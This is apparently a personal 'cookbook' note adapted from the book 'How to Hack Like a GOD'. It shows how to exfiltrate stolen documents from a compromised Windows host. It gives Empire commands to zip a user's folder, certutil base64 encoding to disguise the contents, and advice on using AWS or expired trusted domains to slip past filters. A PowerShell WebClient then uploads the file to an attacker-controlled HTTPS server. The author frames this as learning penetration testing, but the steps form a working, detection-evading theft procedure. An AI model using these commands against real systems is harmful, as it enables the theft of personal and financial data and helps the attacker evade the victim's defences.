# Data Exfiltration

Note: *this section continues from the previous cookbook on Leveraging GPO for Data Exfiltration and follows demonstrations from the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real Life Scenarios" (continuing from page no. 119)*

After our ‘promenade’ through GibsonBird’s information system, we’ve accumulated a treasure trove of data—gigabytes of sales records, employee wages, credit card details, and a myriad of files scattered across the network. However, to fully complete our heist, we need a secure method to transport this data to a safe haven, be it our attack server or another Virtual Private Server (VPS). Without this crucial step, we’re still in a precarious position.

Two key considerations for data exfiltration: choose a domain or IP address that isn’t blacklisted. Avoid detection by ensuring that the destination is reputable and trustworthy. Second, to prevent triggering alarms from sensitive content, we need to mask our data effectively. Let’s explore a method to transform our documents into something less suspicious.

First, zip the target directory to compress and consolidate the files. Using the Empire module, execute the following commands:

```
(Empire: FTPSales) > usemodule management/zipfolder
(Empire: zipfolder) > set Folder c:\users\elise\documents
(Empire: zipfolder) > set ZipFileName documents.zip
(Empire: zipfolder) > run
Folder c:\users\elise\documents zipped to c:\users\elise\documents.zip
```

Convert the zip file to a text format using Base64 encoding. This method disguises the file’s contents. Use the following command:

```
(Empire: FTPSales) > shell certutil -encode documents.zip documents.txt
Input Length = 150
Output Length = 264
CertUtil: -encode command completed successfully.
```

Note: *The "Input Length" represents the size of the original file, while the "Output Length" is the size of the encoded text file. Encoding typically increases the file size due to the added encoding information.*

Selecting the right domain is crucial for avoiding detection. Instead of using random or suspicious domains, opt for something that blends in:

- Amazon AWS: Register a server with a legitimate Amazon domain (e.g., amazonaws.com). This domain is less likely to be flagged.

- Expired Domains: Use websites like Expireddomains.com to find and register recently expired domains of trusted services (e.g., health insurance or banking websites). This trick exploits the domain’s former credibility to bypass filters.

Once you’ve chosen your domain, configure it with a simple HTTPS server. Run the following command on your attack server:

```
root@AttackServer: # python simpleHTTPsUpload.py
```

Use PowerShell to upload the disguised document to your server:

```
PS> $browser = New-Object System.Net.WebClient;
PS> $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$browser.uploadFile("https://yourchosen.domain", "c:\users\elise\documents.txt");
```

And there you have it—data exfiltration with stealth and precision! This method ensures your files are masked and transported without raising undue suspicion.

Note: *This final cookbook marks the conclusion of my deep dive into the "How to Hack Like a GOD" series. While this journey has covered significant ground, it’s important to remember that there are many other data exfiltration techniques, such as DNS tunneling, that could be explored and possibly added here in the future.*

*Looking ahead, my focus will shift towards the practical techniques found in "The Hacker Playbook 2: A Practical Guide to Penetration Testing." These upcoming cookbooks will continue to build on what I’ve learned, offering new insights and strategies to enhance my skills further.*
